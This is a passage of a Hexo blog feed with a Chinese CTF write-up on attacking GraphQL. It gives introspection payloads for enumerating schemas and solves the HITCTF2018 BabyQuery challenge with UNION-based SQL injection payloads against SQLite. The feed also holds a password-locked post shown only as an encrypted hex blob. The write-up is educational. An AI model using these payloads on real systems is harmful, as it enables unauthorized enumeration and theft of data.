        &lt;h3 id=&quot;0x-01-漏洞简介以及危害&quot;&gt;&lt;a href=&quot;#0x-01-漏洞简介以及危害&quot; class=&quot;headerlink&quot; title=&quot;0x 01 漏洞简介以及危害&quot;&gt;&lt;/a&gt;0x 01 漏洞简介以及危害&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;漏洞简介&lt;/li&gt;
&lt;/ul&gt;

      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>当CTF遇上GraphQL的那些事</title>
    <link href="http://yoursite.com/2020/04/14/%E5%BD%93CTF%E9%81%87%E4%B8%8AGraphQL%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/"/>
    <id>http://yoursite.com/2020/04/14/%E5%BD%93CTF%E9%81%87%E4%B8%8AGraphQL%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/</id>
    <published>2020-04-14T06:17:45.000Z</published>
    <updated>2020-04-15T17:03:16.694Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x-01-前言"><a href="#0x-01-前言" class="headerlink" title="0x 01 前言"></a>0x 01 前言</h3><p>​    在之前的VolgaCTF 2020考到了GraphQL知识点，GraphQL在CTF比赛中虽然遇到的不多，但偶尔也会碰到，在碰到GraphQL的题目时候该如何解决呢？于是就有了这一篇文章。</p><h3 id="0x-02-认识GraphQL"><a href="#0x-02-认识GraphQL" class="headerlink" title="0x 02 认识GraphQL"></a>0x 02 认识GraphQL</h3><p>​        那么什么是GraphQL呢？GraphQL是由Facebook创造并开源的一种用于API的查询语言。看到QL这样的字眼，很容易产生误解，以为是新的数据库查询语言，但其实GraphQL和数据库没有什么太大关系，GraphQL并不直接操作查询数据库，可以理解为传统的后端代码与数据库之间又多加了一层，这一层就是GraphQL。</p><p>想快速入门GraphQL的相关用法可以参考这一篇文章<a href="https://segmentfault.com/a/1190000014131950" target="_blank" rel="noopener">30分钟理解GraphQL核心概念</a></p><p>我们这里重点关注一下Resolver（解析函数）的工作流程，假设我们定义了以下的查询语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Query &#123;</span><br><span class="line">  articles &#123;</span><br><span class="line">       id</span><br><span class="line">       author &#123;</span><br><span class="line">           name</span><br><span class="line">       &#125;</span><br><span class="line">       comments &#123;</span><br><span class="line">      id</span><br><span class="line">      desc</span><br><span class="line">      author</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>GraphQL在解析这段查询语句时会按如下步骤进行解析：</p><ul><li>首先进行第一层解析，当前<code>Query</code>的<code>Root Query</code>类型是<code>query</code>，同时需要它的名字是<code>articles</code></li><li>之后会尝试使用<code>articles</code>的<code>Resolver</code>获取解析数据，第一层解析完毕</li><li>之后对第一层解析的返回值，进行第二层解析，当前<code>articles</code>还包含三个子<code>Query</code>，分别是<code>id</code>、<code>author</code>和<code>comments</code><ul><li>id在Author类型中为标量类型，解析结束</li><li>author在Author类型中为对象类型User，尝试使用<code>User</code>的<code>Resolver</code>获取数据，当前field解析完毕</li><li>之后对第二层解析的返回值，进行第三层解析，当前<code>author</code>还包含一个<code>Query</code>, <code>name</code>，由于它是标量类型，解析结束</li><li>comments同上…</li></ul></li></ul><p>​        总结来说，GraphQL大体的解析流程就是遇到一个Query之后，尝试使用它的Resolver取值，之后再对返回值进行解析，这个过程是递归的，直到所解析Field的类型是<code>Scalar Type（标量类型）</code>为止。解析的整个过程我们可以把它想象成一个很长的Resolver Chain（解析链）。GraphQL大体的解析流程很像是遍历树结构，那么他的返回值也是类<em>树</em>结构展示的。</p><p>​        对于发送数据我们可以使用postman或者GraphiQL，相对于burp suit，数据结构会更加直观一些。</p><h3 id="0x-03-常用payload"><a href="#0x-03-常用payload" class="headerlink" title="0x 03 常用payload"></a>0x 03 常用payload</h3><p>​    在对GraphQL测试之前我们要知道只有代码里写了接口，定义了相应的schema，才能通过GraphQL查询出对应结果，所以并不是通过GraphQL就能查询获取数据库中的所有数据。</p><p>​    由于GraphQL自带强大的内省自检机制，可以直接获取后端定义的所有接口信息，常常存在信息泄露问题。那么我们可以通过<code>__schema</code>查询所有可用对象。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    __schema &#123;</span><br><span class="line">        types &#123;</span><br><span class="line">            name</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过<code>__type</code>查询指定对象的所有字段：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    __type(name: &quot;User&quot;) &#123;</span><br><span class="line">        name</span><br><span class="line">        fields &#123;</span><br><span class="line">            name</span><br><span class="line">            type &#123;</span><br><span class="line">                name</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是有时目标网站可能存在几十个对象，一个一个查找出具体的字段显示是太麻烦了，那么通过这两个payload可以获取所有对象和字段</p><p>payload1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query IntrospectionQuery&#123;__schema&#123;queryType&#123;name&#125;mutationType&#123;name&#125;subscriptionType&#123;name&#125;types&#123;...FullType&#125;directives&#123;name description locations args&#123;...InputValue&#125;&#125;&#125;&#125;fragment FullType on __Type&#123;kind name description fields(includeDeprecated:true)&#123;name description args&#123;...InputValue&#125;type&#123;...TypeRef&#125;isDeprecated deprecationReason&#125;inputFields&#123;...InputValue&#125;interfaces&#123;...TypeRef&#125;enumValues(includeDeprecated:true)&#123;name description isDeprecated deprecationReason&#125;possibleTypes&#123;...TypeRef&#125;&#125;fragment InputValue on __InputValue&#123;name description type&#123;...TypeRef&#125;defaultValue&#125;fragment TypeRef on __Type&#123;kind name ofType&#123;kind name ofType&#123;kind name ofType&#123;kind name ofType&#123;kind name ofType&#123;kind name ofType&#123;kind name ofType&#123;kind name&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>payload2：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query IntrospectionQuery&#123;__schema&#123;queryType&#123;name&#125;mutationType&#123;name&#125;subscriptionType&#123;name&#125;types&#123;...FullType&#125;directives&#123;name description args&#123;...InputValue&#125;onOperation onFragment onField&#125;&#125;&#125;fragment FullType on __Type&#123;kind name description fields(includeDeprecated:true)&#123;name description args&#123;...InputValue&#125;type&#123;...TypeRef&#125;isDeprecated deprecationReason&#125;inputFields&#123;...InputValue&#125;interfaces&#123;...TypeRef&#125;enumValues(includeDeprecated:true)&#123;name description isDeprecated deprecationReason&#125;possibleTypes&#123;...TypeRef&#125;&#125;fragment InputValue on __InputValue&#123;name description type&#123;...TypeRef&#125;defaultValue&#125;fragment TypeRef on __Type&#123;kind name ofType&#123;kind name ofType&#123;kind name ofType&#123;kind name&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>具体原理是通过<strong>IntrospectionQuery</strong>，返回包含足够多的信息的结果。</p><p>另外这篇文章里面*[GraphQL injection](<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL</a> Injection)*也提供了一些payload可供使用</p><ul><li>常用工具：</li></ul><p><a href="https://github.com/swisskyrepo/GraphQLmap" target="_blank" rel="noopener">https://github.com/swisskyrepo/GraphQLmap</a></p><h3 id="0x-04-例题分析："><a href="#0x-04-例题分析：" class="headerlink" title="0x 04 例题分析："></a>0x 04 例题分析：</h3><p>这里以HITCTF2018 BabyQuery为例，题目的复现环境可以在github上找到：<a href="https://github.com/JohnHubcr/HITCTF2018/tree/master/web/BabyQuery" target="_blank" rel="noopener">HITCTF2018 BabyQuery</a></p><p>题目打开有一个点击查询成绩的按钮，点击会弹窗显示成绩，右键源代码可以发现一段js</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$(document).ready(function()&#123;</span><br><span class="line">            var query_data &#x3D; &#123;&#39;query&#39;: &#39;&#123; getscorebyid(id: &quot;GE&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;)&#123; id name score &#125; &#125;&#39;&#125;</span><br><span class="line">            var btn &#x3D; $(&#39;#query&#39;);</span><br><span class="line">            btn.click(function()&#123;</span><br><span class="line">                $.post(&#39;&#x2F;graphql&#39;, query_data, function(result)&#123;</span><br><span class="line">                    alert(result);</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;)</span><br></pre></td></tr></table></figure><p>根据graphql可知后端使用了graphql查询api，我们使用上文中的payload，查看schema发现Query 操作有两个field: getscorebyyourname和getscorebyid 参数分别是name和id, 通过手工测试发现id参数经过base32编码且仅能是1位数, 而name参数存在SQL注入，那么可以构造payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">query&#x3D;</span><br><span class="line">&#123;  getscorebyyourname(name:&quot;xxxx&quot;)</span><br><span class="line">&#123;</span><br><span class="line">score</span><br><span class="line">name</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>name参数的值用我们构造SQL注入语句的经过base32编码后的结果替换。</p><p>首先是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union select sqlite_version()-- </span><br><span class="line">&#x2F;&#x2F;查询出版本号:3.11.0,那么可以判断数据库为sqlite3</span><br><span class="line">1&#39; union select (select group_concat(name,0x3a) from sqlite_master)-- </span><br><span class="line">&#x2F;&#x2F;得到users和Secr3t_fl4g</span><br><span class="line">1&#39; union select (select flag from Secr3t_fl4g)-- </span><br><span class="line">&#x2F;&#x2F;得到flag：HITCTF&#123;fee26d3a146a404e106b1ed93156f30e&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/14/%E5%BD%93CTF%E9%81%87%E4%B8%8AGraphQL%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/image-20200416004911642.png" alt></p><p>参考资料：</p><blockquote><p><a href="https://cloud.tencent.com/developer/article/1528799" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1528799</a></p><p><a href="https://segmentfault.com/a/1190000014131950" target="_blank" rel="noopener">https://segmentfault.com/a/1190000014131950</a></p><p><a href="https://blog.csdn.net/qq_41882147/article/details/82966783" target="_blank" rel="noopener">https://blog.csdn.net/qq_41882147/article/details/82966783</a></p><p><a href="https://www.anquanke.com/post/id/156930" target="_blank" rel="noopener">https://www.anquanke.com/post/id/156930</a></p><p><a href="https://www.anquanke.com/post/id/147455" target="_blank" rel="noopener">https://www.anquanke.com/post/id/147455</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x-01-前言&quot;&gt;&lt;a href=&quot;#0x-01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x 01 前言&quot;&gt;&lt;/a&gt;0x 01 前言&lt;/h3&gt;&lt;p&gt;​    在之前的VolgaCTF 2020考到了GraphQL知识点，GraphQL在CT
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>出题笔记（一）</title>
    <link href="http://yoursite.com/2020/04/11/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>http://yoursite.com/2020/04/11/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/</id>
    <published>2020-04-11T07:46:00.000Z</published>
    <updated>2020-04-12T08:53:43.243Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="0f5575875875b2be4fc9ff7ef7fba887d8681309c2a915bec81e81cdff6b09fd">a7af55643fb17828ae2be71d6364b2f13848a95c2afc620e38a7ecd9e604037e2702774c8c0de18f25c3cf576184772f62f2befb3baa6b2f3c7b804e4baee12ad44fe5e99b79ba74d36224e3dee75c1649de841a4018baebb3d03fcf86607faad4aa804b6835ab0f07b4e93e8c46664d12d3ed13dcd14d16f90ee314f456713c579616961453d6d403c2f45e9864af4ba87ce312e1bc9b627deedf7a5c599102f6800625c99a5abd0fcd41aa8ca8eaa021f6bc12e9bdb6a2581a9cce861486c6a8f29c10c97fc1f5324ede38553ea72357eae90bd2b9f56aba723d02bb1e18e278c1e618bb280b8022fb78aa23d594f2ceaa492dda8f548a1e77be9728fa928ca419a31055170848846debaf94a9d6aff17aa7cba43fc5ee92258810490f3cb4d7936d12e5079749e1acc30209b576b0d1193bdd9db06edc1550effef4d3be9ed52ad5e87dd9f5fa3e422450e264ab35e1690bfd6e4ef24c6a35605088fc53131f98a315751fd3f2db2e841ec377955f190382e541d54b269fddbbecb4cf322a1eff8e069bc3be1749786ba8ad1aaeca7a07454e41b89c9e35fc7b93d9810c20036bdd53054100b1f85ec353b98bd9100c08a0d3590f33232a85fb69238a13b8e107f92d132214046fe58944581c8d0fb3616afc7e47f980c8f1db4175d1dd6ea68cfe831a202a7eac480cf9f211d5c0fa18eb85260234bfddc2a76893d44a5cf63f11be813b17b972d66560563ee4ff78285dacabc78e7b64e91589d4d634fbe60a188f87234f1f9eb2067bb9ce9945ba040ce36dd9f9919e32a1d833ab0748282df7943b52b910d95318b1be1d12245aec710a853eadf8d7259bdd8ba5db85b1573295c8fd351fc7295f58e50656d01bd94fb7a43a9edf63ffc8344f6af13df8ac1d1607777399c15d8debd7ea0b4db116ffeb174d52c2afb5f1a30f0f668297e52c00758ed12f55c530682cc2ac31d8d6c84a8830f3e7655ebf75750c6e8d9472590aa1c547fce068e79f3f265fa610f04429f503ce7e737f41e31b0d3db70f415ec0de9b7229c6b010cece5baa9fcc04c847c434f609bf0f4edbd1b24658033ffd6d19c4ba91395ce0a2889f181629b2b70ebf719bc9f68d1e022f3b5c6f22b24820a1a1ad18762dbf7d1723837d9c365d42a1f86ebdc31b651dae434bab58978ae546e422dbad0bdc46afacebc8e94c3ed4559517531c43be67db857511e921543b51a1756b7aeae5e2d53baec01d1bab2271c88e5a68f70502c54f04ea67b429a2b299d98757c60842fff6e2ba025af08468820087c6da49d5d1cc99a09113aa02e87243ba2f9f65790a1daeebcbd633cc307cd1496346b3da15688c068442d9c3c913dc44eaaaf80df19ea2585060320a2c77d6a8d9d063524b7b206aa72b9f75547c2ee84ecebac3a16f6b3ce63fd4bee56d2cac22bd60f45edc09e2fd93abae5b00ab22dea04db791efddf03e34a93631b0d133352a2aa985337e6377ad0bf19cd486d7e74782dd618363089db92867db257401405976aaa2cf7b24a931176f76b2b050a57d6d3574f3d1ea450279a3088040fa062d3e9eb62d393078c47dea7459d8eb9b2906092f23406334a99d50b8586f4d31e217ca22251f0ff20a778cae5d70d59c140cade343149a73b05b20abe457ec39dae621583f21d760eacd525a53dc09506f434a933db26907bcc6c8a440d6512ee6de7aea8a0cfecc5147d73b00cbce25b6e88011977d5c94eea382bec663c5601377c7f63daffbe4027c2c779f88574d1fe1f6cabc8235098b85c2af0ba42ef06b9960583a78180637d4e3d4288843bd6e4f2f8f3b6369fd76780a285907d304363faaa2fa2d15ace3b65cfebe036e575e238032e02ee1bd7712281fb57c89274cd4701f5295cc732166a8414fa6caace76484a75f30f1dc995e0bb20b1de169e3bea7291fddc7a7449d7dee329bda33cab0e74a3e02da014fb1c5d5aafad55a8b908bdc323ddce15b9e67a2acde37d2a5b2375ccffff21092b3003bf71eac60e1ba7d2fcdd40397c3b14e0aa3b4175f4103d0da749e59103f9fac6365a1c0803b1bfbfd1a2db8ebbf2ad649d94960c6f4b4ca5699d07a3a958b60b264a7979f04d29be8ae1217ff640a685a42220d584ade4a01dea67b638e6bc8e9fdb9548301c1f93fc817a2191aeaba8f96e0aa494d7d082e114c1e3840a7691ed389bbcdb4a8c330e096e99335c3640d4da132337bd1a8911ba397f2a950df7decc919cd04c4e778594c8767f67bb9cd43dd03e429c680dfe51c5a316284a2de314c92c37773bb6565b7202740b62ded2573130dc5d70795d78cc8a4b1a88d0fd83dddaa903f9c2fdd7214126f8f2307e5ac92b6d588ef392744ab8cbaf73eeb274dcb24d518d649206e85060f877f0798869145073f0026f08adbbb3d12f2d4db833dcf63d80a58124507735dc5f82e16a61a23213d7129d5fb3d5bcfb3846e9c82a4b220320b5e3012a10d2409796e635f89130d9c3f24917dbb9ab03a573b7caaef64566805f6ed883fe7b0962f50499482fc78296536b80baaeb1d1bf83865dc3b39c079f5ff9dbebd6fbb805935c7d799457222ff6cb1332ffa66019655dcf181beaae16552cf0a15ddddaa9107d88702a1f68ac609f7ba46aa7bdcde460e0e2ed446d72fd936d9294dce4490fb637ea7a49d6be480d91d0e25712c34b8a5095f162d1502679ec4bbecb67026cfbf4423874870fd0cc975f2317987d66df8ed9f9193cbdbfb1045a124832e5719befb52053af7a41b271315adf0369b89f679a89b02491fd79a0f366e410e1ac2d9f3016cc02edddfa1caf69a2e0126efc1c524a3227b5be980248b96da876a1a930b1e76dde34761c30edad2dfec473458196da62aa5c2dbe68b66914a1e26eee417a8971208b59bf81d890390228e1665478e5e25d4135a2295da4c0cd7f6389da6e83542f4440213c265d61633c7c7546231ea04202484e1d50c918b7a81dd859e2c6af3d967a2e548da808d4c5380617c76feb1a2b3d2fb961ef81caf0a16cce1ed742b0b965a09b2c71a13c31b5fc1fab4c19ed172b3177ed3f8deb677d1eecc04e1f23ce96ab1937695fdcee51db498a352cf8b288e996b42bb419dc87351f36f03b032c721a2a95075820a4baca643a4433da2a17970b5bb1d170cabfba4a11e65eac6f544d024cb247e7bc68f05087b2b0243c1e6447834298fdeb89c6b719d128feaaf9daa63acbcb75f17decb252c954731b8a1b64105af94d54586007eb6d4f4947f668bfeaa8164a2003adbee6b81cff8e3ce23eb03ce67be3822504b2ce1d56db4993d4324bae5e75832abc064f4a7a56b6fe6ccf7ff78c6ad1666d6f2dcf693f56d7c206e956e7fa7f640a9e184c1ae576ab0a5a11ef5ed428ca5eab964e4f28870710a16c1b5208208a64f4733b66af71b65015313abd902e6168f641c06eb833040efeb2d96ef0eab171ed7205c27c5c986dd84afacb0f720044a7937c09365925a2aeaeeea3180d926396685a569a365b3d2eea55d3b018c925b8c8e4c6b08c0a6d56c545f2dad4fc1e625fdd1df28c7d3c1fc209474cd3fd9ce64137abc9f48bae81ac5cc0f8bf02a925e2ebbc028b22c74398f4e6f006d4ea58e839c8b4f901cb196a7659d33dc6cd652b165321564bcae4624f22d0cecd7fe9a10e4b2169047ff5dc88a1404d59a754c6c2c0b0736d9b729dbf9d2c4caca965addd0104877d02090153de7b11ac6444973bbfe38a1c9c0a0913a488d50e1f5b05c6cd848a9d4d688ff2047b155963b8575e04c171a437f4b0f5d8fa2afe610d3bff867378ab67146b55e4d466f6095517dac12ea65deb0fc0d27f4a00425b65f6e42c80f9b7b98c80807d57cb75bfb8be986d3d9745a2ef32eaf0164c0f8f9fe44270742eb4df3e3794a06da6c44143de221248afd7974f03510dc06d57520e841657af9b8bcd7555ebd5bb8d7e85f6f43e890b7b80f7f0df829563d9c294ef0ee4ed3e5eb0253ca7a9c98009dec50340dd469a478758af7c76beff763d21757745607248669720b3450b327f4881233666e4867b21c23d687147da13b3c7d6aa16fd810e933df8ebc10f15ff396f6aa9058ba96202f8809bdefb76b9610e47a4eded02ed1bb7edc120279ca1680f33ec8fd58db1cbebd69fb92ec8d51e1bc00fbf2e5cbf4523fbf8ace349c80b21c433dc8459cb49bfe9f9b643eac7c9875b90059e04160abc32ada8128f4fb9c4b77e331eeeb37fd9154e637f75481d9572db5761cfea8c3a55f6c5980ab7f032abebc210dd75b066ff188900ac837666b78bbebcbd7208a8b2f0f4b453e91b2d5e203a713eb6b0b169c1b51ff24f400decc02cc4248aab3f3a23e5f4e3cde01faab0c5d5fdabfb1e535d7f6c04dab064c01009c1c99b0561c6d06b4986100a342195b1cab36e1142f34b134dbbff89d804d733d9375ca692cf89b252fd1c84dc73713a8d595ecf34ac3a6ce7fc50924f8cdb5fe8315fa4ac2c1e9301e19a207461788c982f4b3bfba508e3af28fa66057a55c24aa287cd7b6d54322d3e380247f05886c87c1133153aa6ad2943e65940e16f35c38375533780a816a64b01cf8c97a50203dedfea5355e570c50e317a2136410cff922d7cfc21becb13cb7861498661ffa6201785d555200b32c8d56acef28c4b0a7c86a40c9bbbbc784bde7b60cb3e74af1a2ca0744f4acc9b1e69c987b59bbeed847a8af736b16644abf76b60e6d84fa0469df4eb20467ac1253ba1b32a3c7b1900ebe139808dd6edf0a82e73fd6252e6452740e6d2b5a94996325452042fb73bd277ae3e4219fb59faf720122c71cb5dfd9d41901e228c1b87921e9e25f328999aa71705a25a14f00444e4ad3f1226eca979e48eabd20cbb22d9f8bc22c2363e17219b8ee3b6bfb35b920bf42a18ce2960ffb332f62ac74aa43d19d1e4234d372d8c94ec988dffef9bbe08f278728bbfd58f402e2ba553922c028f2d35abfbd84d2fff53b8a18538669d4a87f1ed69525d5c9e3948f8ed5b0d88338f5aad495900349f759638b9bf62dd3ff7b3ab75b7f575d1258a2238b676a778773e582695e531daedebe754f5e33d7f0b0d36e9c154a5e286843527624c94abfe788864aae3f2dabf78a7835695dcd0aabceab38f1c8881d637812297d785f3f4a482aaf12174c2ab1596b7135aa8884b74cdaa3e4eb4a2ebe3e9a87750d88c9cd1971032dbdc9ffc2a481ded118063400b52790cfc4b9b1216ca6f24bb4edc30bec685af9e7713ad570d1022126a43e1e5bea3d714961fbb83a6848b03916ee1d3337a8cb943e2d0ca34ce4c4d81862c5f07734e7492834e02d8f231cdd9a15d99a262096bd1f658970cb1ee3e66c0a04fb32d39b718cda1cf9fafa03ee86f367bb37c2d3a11072d3916ce224fbc5d831a49bf9962f50116f639345b2aa4a748c88efb49f05d0e31516d6c020112372f18b70331086b1f1ca448d9264b317a81edb4e1b23b6cf0a57689a5598bfc407b75a547da5ec7d1367cd4be12d799f5c601d9177d4882b0a655abc8598accfdaebbd6032a6bea19c07d15ce7637428ce93f4ae686cdf26ef75ff716218802a6e7633e558c1e53cba6024efd55034676fb596cb4f814542b3517b60846bdc38a124712a37e9de22db40d7414d649acb354e7c52258a8489fcf1f3d380ad10bf79d2c0b9a2927fb86405f66145aec730d34c3d0b79a5465d719f16993582a7b410788e807355e4283ee4bde68ca8568de6d58e0391d27f50359282559ee43edcf66fb9d651728025fbf1a17567324badd0ab9afa4377e399ae57778b5cd6a456f7448a83105d2c13b4deae50342d2db281d590344bffdaa45bc58d01c64c79b79d7c0a60df9600a7b9bced879f7bda64ec693f08e65129c23b26908f97ba126cbfafce1f63373f13fd05c7dfdf7c71148160ea24b9b17fe33721a22487b21c6ebe6fac90fcc8d8f50fa5232fbf3a5c6378a9bc4d6bca1baf346130319e2cc5cb04ff30219b7780253812ddbf7bffc3f6d3a2f4a4fcb91d170d065afe7c583356ba9d7e2bdd2b5a7f79937150cdcfea1b450fe47054da8255d4ce175687d383a00ed47370e50b0013ecc6da4cbb3d8667a921a3451bd35e6563b25b107b7d7fe46830fc19afd283464000c1fdadffbaedf5023296bfe3ddf12f6ce47b83554920af1579d3b6bc7a14bcbd17be9d69d1d154c51d61e2de0f8e573030a61864d7d17dc05db73621271498774071c7a7d0a3cf394861a3f7c306e266e42cdbc6119b1f8242245658c3153dd21ae5b343e10609ea7d5d7f75e8afe4e29054cf51695f3892e3330091d1ac21d7aa92211c887fb53d28e9ec392378cfa136dabde343e4f536bf90b09d48ac74fef18f087ba42ce09935c24e79f1ef0bc57cd7f6902856875271c78a04a086ed8583d9e57a1fedc1df25f9224bc97739ea996420054958311f45ec9a5cafec1845efccaaf6b3d63a13fd01ec77cc2edff1ba4e8d1fb951b5ad1f341ae9949643f2ef04ec92a3883d5d6b166948e9da7490080b091cf08d02b7718095b52828eeb1e1da7c206731fdb48c50401adcf457e8f89e995330f2dfbb2e942cb438bfd46f0a80f407a9ce1024b95c13b74df0eb46461c022535ea87fc1d72c01d0aec9733a2de77679304d6022cd88a68caaba2f2b5cacbe7772d5cd80cf15181cebbc8ac4d9527d6e95c97b5aeb53d83e11a0569332d52ac699c63d95c701e8d92cec9db0b3c8e24f45beb57b3de4fe41c4afa0900573ce84d2e26173a00d1bef70483350f1e706e532a25cc44a77f8bc49709619a72cb6edc5f92920850362b04d08ff3a0f8b1f905a88be599de7c9dc43f56f2ebc468d84d5b6a904ef101d4f60c2a68816ace349c35ebcce24fbb50c88885fdaa2f8e5150352604bc35cd7af17864bb88922d54c2c1f7e90f493caf18667e5b662d3d3cbe554a27107853a869738c141cc19b9c13c7e943f9a2a49527d7052780aa9e4659f01054ba5e3f4af308e1fdc1a63d7bb14054dbd399236949205b9d80d2d57111ba59d6f9df678370f74c3a1ef29a912c6d3a90aaa0158572ed8a032f7c614fbbbdc33813707c0ef29ce8c916e09bade821db3586877b5e9bfa0d171aa5f0c424234036d2577df7c587b567eab2eec3ada4f45c6552d1cfd83f6da5aa1c20c3c14469eb4c9e75dbf0f8768a77062a5647c57a57a3839d4572413b72c92e1bc5aa682d2e4dbc10c64fb2c4bbd910132f11626034fcb1ed456e6e70cd10253d44bc5e6d3abe0bbb73b082ef86dfa05d9678bb01daa12d984bbc92133f70b6c7f4cab52ecb84490f75959f2559f0672089af061fa16b747da10ccb35ca7a0ae509107872225acb472ce46430f3cc59d952beb1f993d4e3b144f699c136dd270e1664874d50778b57ec73e52e51980c568296101bcd54c290f73ab75eb242f07e22b80baa666f5f6ef3d81f6bcbc49953a5babf3733e3116d1a679ad42d3bb846097f6dbf2c29ea2249fff595d805f5ed0ca8234ddad5ff41411f29efe65d99dfd8e589289646de347dfa42e4f5cccff184b4d3a9059b98450acceee3ac89f84131b85093ef93cfed7d1783e389d76d0c3f82dac3dcb09065fc11cb550cefff3ebf3c6938878bc80bed7678009906f6312545fbd288ac0f405ae23c273b8280166fe9742750cd39983f1874261fad0b0fd16e38536709841ff8a50ee0a9c2a80a72d6f2967685ece2fd74220d769fd97bed41cec51a1a6af3607636ccb3a7e8b6b5c2f87e79c274faf069ff538742a3aba5acda22ff80b746edb4d11794ffa505f0016f1033ba4a750cb323ef2642026e251fc58271035acf15b22be4b914f04d1e9b20eed4819cf5ccca38711ae0824c9fa5291085bb59944b7f3fc834c8e65bf7bf3bb21834bbf0b31672ad272509cd887a270243fcf01fd8d9a33e6da1b458077bea5f4131d8a2f24e9db60f4a817c9531c4df641ce3c4bbddd80b4f22637267dcddba50aff01d9b016b874148af0e0e3757111e94ef66ec27ac66bda0352dc21697c354c1437ebf46c27e1d7c2b825bc5ded22bec999677747a738bb32066fbabd40bd9cecbe919585f95773ac1abb6a0cc8127509678c5c9749a9b8e43993f935f4c07197de8f65f9b5c3b840d2b1a6ae35b126a7426eae6bf6b9224e248c991d52d10cada7fe07cedb8faa0401dec55080ecc4e0f5198119f5792399651a2acfe700f6c97533f2ed11d82168a42f89d023215dca0831348266db4fe87f38deb972b98156bf2fc24d9db01503a92a7073c55753735f8ffdc8ebbeab4d3a67420f97f3e221758e13978f81011d77ed742841fd77e719171e389fa2d53566acf368981881c6fced950a18902c66294ea211288ab631cc910f6ced2873e0793adb262e5702c341a945ffecb9861228d86a53a2123f26b64b2dda5470ff4eba93cb7b406dd99fdc8e2194ffcbfcefa96150266cc17d98c107ff964f7b511b633035cee69b38594624d639f395ee0fa8e41960a16c175f303db7ef71b995349f401459cb2a759a2a2d93552b228fbbf285a6f2f659f16da2a19097ece7f5c3ac30e3fda2a3974c9a4bbb1d9fde5794528d834c57d33acaa389abbb2bd0e063a519d2cf3bc2e9663230da8b6bc7d5312f47264c238ce92e3d8129c6357cb3bc741d2cd33038a01fd5fd905dd333c242ddb12a9782f1fd102cebbc04b889b5efb2998e6dd51508ef71e7d59956e67d3b62843b3b8a4920faf3b0d9db9cd7b73821d515d4f95078c5dc6c43b972ea03e305d5b87d43c9da037cfcc9bc03c23e1d5cb13dd2d7600d164b32ad029738342c9295d2ef9c42ee619d96ebc60d7e919ee67f880b3ddbe52b4a6085fbc00cb84370304579d322e18082179af645439b77f035134c84fd0357319aefa7ce76ada83995728336f069